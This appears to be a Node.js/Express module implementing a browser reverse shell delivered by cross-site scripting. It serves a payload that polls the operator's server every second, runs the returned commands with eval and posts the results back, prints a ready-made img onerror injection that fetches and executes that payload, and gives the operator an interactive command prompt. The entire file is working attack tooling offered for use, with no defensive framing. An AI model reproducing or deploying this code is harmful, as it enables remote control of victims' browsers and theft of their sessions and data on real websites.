const express = require('express')
const cors = require('cors')

function startReverseShell(host, port) {
    const app = express()

    app.use(cors())
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));

    let command = null
    onResult = null

    const shell = `setInterval(() => fetch('http://${host}:${port}/command')
    .then(res => res.text())
    .then(async command => {
        if(!command) return;
        const res = eval(command);
        fetch('http://${host}:${port}/response', {
            method: "POST",
            body: JSON.stringify({res: res?.toString()}),
            headers: {
                'Content-Type': 'application/json'
            }
        });
    }), 1000)`.replace(/\n/g, '').replace(/\s+/g, ' ')

    const injection_img = `<img src=x onerror="fetch('http://${host}:${port}/shell').then(t=>t.text()).then(c=>eval(c))" />`
    app.get('/shell', function (req, res) {
        res.send(shell)
    })

    app.get('/command', function (req, res) {
        if (command) {
            res.send(command)
            command = null
        }
        else {
            res.send('')
        }
    })

    app.post('/response', function (req, res) {
        onResult(req.body.res)
        res.send('')
    })

    app.listen(port, () => {
        console.log(`IMG Injection: ${injection_img}`)

        // Repeatedly ask for commands
        const readline = require('readline').createInterface({
            input: process.stdin,
            output: process.stdout
        })

        function askCommand() {
            readline.question(`Enter command: `, (cmd) => {
                command = cmd
            })
        }

        askCommand()
        onResult = result => {
            console.log(`Result: ${result}`)
            askCommand()
        }

    });

}

module.exports = {
    startReverseShell
}
